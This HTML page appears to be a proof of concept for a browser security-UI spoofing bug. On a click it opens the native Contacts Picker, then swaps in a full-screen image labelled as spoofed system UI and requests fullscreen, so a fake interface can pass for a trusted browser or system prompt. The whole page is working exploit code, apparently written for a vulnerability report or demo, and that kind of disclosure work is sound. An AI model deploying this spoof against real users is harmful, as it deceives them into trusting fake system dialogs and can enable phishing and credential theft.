<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof (Post-Picker)</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      font-family: system-ui, sans-serif;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100%;
      height: 100%;
      display: none;
      object-fit: cover;
    }

    #content {
      color: white;
      text-align: center;
      margin-top: 40vh;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof2.png" alt="spoof-ui">

<div id="content">
  <h1>Click anywhere on the page</h1>
</div>

<script>
onclick = async () => {
  // 1️⃣ Trusted system UI (Contacts Picker)
  if (navigator.contacts && navigator.contacts.select) {
    try {
      await navigator.contacts.select(["name"], { multiple: false });
    } catch (e) {
      // user cancelled or error — still continue for demo
    }
  }

  // 2️⃣ Replace page UI
  document.getElementById("content").style.display = "none";
  document.getElementById("spoof").style.display = "block";

  // 3️⃣ Enter fullscreen (no race, modern behavior)
  if (document.documentElement.requestFullscreen) {
    document.documentElement.requestFullscreen().catch(() => {});
  }
};
</script>

</body>
</html>
